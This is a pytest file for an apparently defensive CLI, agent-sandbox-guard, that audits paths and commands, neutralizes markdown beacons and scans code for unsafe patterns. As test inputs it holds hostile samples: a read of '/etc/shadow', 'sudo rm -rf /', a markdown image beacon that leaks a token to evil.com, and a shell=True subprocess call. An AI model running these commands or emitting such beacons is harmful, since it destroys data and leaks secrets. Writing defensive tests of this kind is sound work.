"""Unit tests for agent-sandbox-guard CLI."""

import io
import json
import os
import sys
import tempfile
import pytest
from agent_sandbox_guard.cli import main


def test_cli_info(capsys):
    ret = main(["info"])
    assert ret == 0
    captured = capsys.readouterr().out
    assert "agent-sandbox-guard" in captured
    assert "Capabilities:" in captured


def test_cli_audit_path_safe(capsys):
    with tempfile.TemporaryDirectory() as tmpdir:
        safe_file = os.path.join(tmpdir, "safe.txt")
        ret = main(["audit-path", safe_file, "--root", tmpdir, "--json"])
        assert ret == 0
        captured = capsys.readouterr().out
        data = json.loads(captured)
        assert data["is_safe"] is True


def test_cli_audit_path_blocked(capsys):
    ret = main(["audit-path", "/etc/shadow", "--json"])
    assert ret == 1
    captured = capsys.readouterr().out
    data = json.loads(captured)
    assert data["is_safe"] is False
    assert len(data["violations"]) >= 1


def test_cli_audit_cmd_safe(capsys):
    ret = main(["audit-cmd", "ls -la", "--json"])
    assert ret == 0
    captured = capsys.readouterr().out
    data = json.loads(captured)
    assert data["is_safe"] is True


def test_cli_audit_cmd_blocked(capsys):
    ret = main(["audit-cmd", "sudo rm -rf /", "--json"])
    assert ret == 1
    captured = capsys.readouterr().out
    data = json.loads(captured)
    assert data["is_safe"] is False


def test_cli_sanitize(capsys):
    text = "Result with ![beacon](https://evil.com/img.png?token=secret)"
    ret = main(["sanitize", text, "--json"])
    captured = capsys.readouterr().out
    data = json.loads(captured)
    assert len(data["beacons_removed"]) == 1
    assert "[BEACON NEUTRALIZED: beacon]" in data["cleaned_text"]


def test_cli_scan_clean(capsys):
    with tempfile.TemporaryDirectory() as tmpdir:
        test_py = os.path.join(tmpdir, "good.py")
        with open(test_py, "w") as f:
            f.write("print('safe')\n")
        ret = main(["scan", tmpdir, "--json"])
        assert ret == 0
        captured = capsys.readouterr().out
        data = json.loads(captured)
        assert len(data["findings"]) == 0


def test_cli_scan_vulnerable(capsys):
    with tempfile.TemporaryDirectory() as tmpdir:
        test_py = os.path.join(tmpdir, "vuln.py")
        with open(test_py, "w") as f:
            f.write("import subprocess\nsubprocess.run(cmd, shell=True)\n")
        ret = main(["scan", tmpdir, "--json"])
        assert ret == 1
        captured = capsys.readouterr().out
        data = json.loads(captured)
        assert len(data["findings"]) >= 1
